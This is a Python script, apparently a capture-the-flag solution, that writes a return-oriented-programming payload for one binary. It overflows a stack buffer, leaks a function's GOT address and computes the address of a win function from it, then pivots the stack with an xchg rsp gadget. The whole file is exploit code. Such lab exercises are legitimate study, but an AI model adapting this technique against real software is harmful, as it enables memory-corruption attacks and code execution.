import struct

read_prefix_addr = 0x4008bc
new_rbp_value    = 0x601300
pivot_dest       = 0x601800

buf_addr       = 0x7fffffffe0d0
saved_rip_addr = 0x7fffffffe0f8

ret2win_addr    = 0xa81
foothold_addr   = 0x96a

plt_foothold_addr = 0x400720
got_foothold_addr = 0x601040

pop_rax_addr          = 0x4009bb
xchg_rsp_rax_addr     = 0x4009bd

mov_rax_from_mem_addr = 0x4009c0
pop_rbp_addr          = 0x400829
add_rax_rbp_addr      = 0x4009c4
jmp_rax_addr          = 0x400803

class Exploit():
    def __init__(self):
        self.payload = b""

        self.hints = []

        self.padding_int = 0

    def pad(self, num_bytes, b = None):
        if b is None:
            b = bytes([self.padding_int])
            self.padding_int += 1
            
        self.payload += b * num_bytes
        self.hints.extend(["padding"] * (num_bytes//8))

        if num_bytes % 8 != 0:
            print("Warning: padding is not 8-byte aligned.")
            print("This will mess up the hints.")

    def append_word(self, word, hint = ""):
        self.payload += struct.pack("<Q", word)
        
        self.hints.append(hint)

    def append_pop_rdi_chain(self, rdi):
        self.append_word(pop_rdi_addr, hint = "pop rdi")
        self.append_word(rdi, hint = "new rdi value")

    def append_pop_rax_chain(self, rax):
        self.append_word(pop_rax_addr, hint = "pop rax")
        self.append_word(rax, hint = "new rax value")

    def append_pop_rbp_chain(self, rbp):
        self.append_word(pop_rbp_addr, hint = "pop rbp")
        self.append_word(rbp, hint = "new rbp value")
        
    def write(self, filename):
        with open(filename, "wb") as f:
            f.write(self.payload)
        print("Wrote {} (0x{:x}) bytes to {}".format(len(self.payload),
                                                   len(self.payload),
                                                   filename))

    def show_with_hints(self):
        for i in range(len(self.payload) // 8):
            chunk = self.payload[8*i: 8*i + 8]

            print("0x{:>3x}".format(8 * i),
                  "0x{:016x}".format(int.from_bytes(chunk, "little")),
                  "   ->", self.hints[i])

exploit = Exploit()

### Add 0x100 bytes of padding to get through first read call.
exploit.pad(0x100)

### Add chain to call read again, but into a known address.
exploit.pad(saved_rip_addr - buf_addr - 8)
exploit.append_word(new_rbp_value, hint = "new rbp value")
exploit.append_pop_rax_chain(pivot_dest)
exploit.append_word(read_prefix_addr, "back into main")

### Add chain to write into the actual pivot area.
### First we need to call foothold function so that its
### actual address is loaded into the GOT.
exploit.append_word(plt_foothold_addr, hint = "load foothold in GOT")

exploit.append_pop_rax_chain(got_foothold_addr)
exploit.append_word(mov_rax_from_mem_addr, hint = "mov rax, [rax]")
exploit.append_pop_rbp_chain(ret2win_addr - foothold_addr)
exploit.append_word(add_rax_rbp_addr, hint = "add rax, rbp")
exploit.append_word(jmp_rax_addr, hint = "jmp rax")

exploit.pad(0x100 + 0x40 + 0x100 - len(exploit.payload))

### Append the chain that will pivot the stack.
exploit.pad(saved_rip_addr - buf_addr)
exploit.append_pop_rax_chain(pivot_dest)
exploit.append_word(xchg_rsp_rax_addr, hint = "xchg rsp, rax")

exploit.show_with_hints()

exploit.write("payload")
